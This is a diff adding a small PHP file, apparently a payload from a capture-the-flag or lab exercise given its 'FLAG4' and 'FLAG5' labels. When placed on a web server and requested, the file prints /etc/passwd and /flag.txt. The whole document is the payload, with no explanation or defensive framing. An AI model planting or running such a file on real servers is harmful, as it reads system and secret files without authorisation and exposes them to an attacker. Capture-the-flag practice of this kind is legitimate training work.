@@ -1,0 +1,6 @@
+<?php
+echo "=== FLAG4 ===\n";
+echo file_get_contents('/etc/passwd');
+echo "\n=== FLAG5 ===\n";
+echo file_get_contents('/flag.txt');
+?>
